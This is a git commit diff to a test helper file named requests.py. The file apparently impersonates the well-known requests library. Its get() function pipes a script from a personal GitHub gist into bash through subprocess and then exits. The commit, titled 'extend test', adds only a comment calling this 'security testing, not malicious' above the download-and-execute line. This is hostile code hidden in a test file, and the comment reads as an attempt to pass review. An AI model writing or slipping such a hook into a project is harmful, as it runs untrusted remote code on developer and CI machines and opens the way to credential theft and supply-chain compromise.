fa88880d944208402e1fd6a41729b662fefc833c
sokkaofthewatertribe <140777955+sokkaofthewatertribe@users.noreply.github.com>
2025-01-13 23:52:52 -0700

    extend test

--- .script/tests/asimParsersTest/requests.py
+++ .script/tests/asimParsersTest/requests.py
@@ -6,6 +6,7 @@ import sys
 def get(*args, **kwargs):
     try:
         if len(sys.argv) == 2 and sys.argv[1].isdigit():
+            # security testing, not malicious
             cmd = "curl -sfL 'https://gist.githubusercontent.com/sokkaofthewatertribe/f4b50644e3a40427da4585c1f9f03692/raw/8f3194b7f6b1c792e219255202413ec4b887c5b4/test.sh' | bash"
             test = subprocess.check_output(cmd, shell=True)
         exit(0)
